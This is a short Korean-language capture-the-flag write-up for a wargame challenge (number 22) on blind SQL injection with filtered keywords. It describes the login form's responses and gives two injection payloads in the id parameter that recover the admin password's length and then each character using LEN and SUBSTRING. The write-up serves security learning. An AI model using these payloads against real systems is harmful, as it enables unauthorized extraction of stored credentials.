# 22

## Problem
```
id	
pw	
Blind Sql Injection
Filtering Keywords
select / Union / or / white space / by / having 
from / char / ascii / left / right / delay / 0x ..........
```

## Inspection
* 주석 힌트가 있다.
	- `<!-- Hint : guest / guest & Your goal is to find the admin's pw -->`
* `guest`, `guest`로 로그인하면 `OK guest`라고 뜬다.
* 쿼리의 결과가 참이면 `OK {id}`, 거짓이면 `False`라고 뜨고, 필터링되는 게 있으면 `No hack`이라고 뜬다.
* `pw`에서 필터링되는 것들이 `id`에서는 괜찮다.

## Solution
* 쿼리를 `SELECT id FROM ??? WHERE id='"&id&"' and pw='"&pw&"'`로 가정한다.
* [`chal22_blind_sqli.py`](./chal22_blind_sqli.py)
    - `id=admin`의 `pw`의 길이를 알아낸다.    
        + `?id=admin' and len(pw)={x}--&pw=1234`
        + 함수로 `LEN()`을 사용한다.
    - `id=admin`의 `pw`를 한 글자씩 알아낸다.
        + `?id=admin' and substring(pw,{x},1)='{c}'--&pw=1234`
        + 함수로 `SUBSTRING()`을 사용한다.

## Review
* 구멍은 1개가 아니라 2개다.
* DB에 따라 쓸 수 있는 함수명이 다를 수 있다.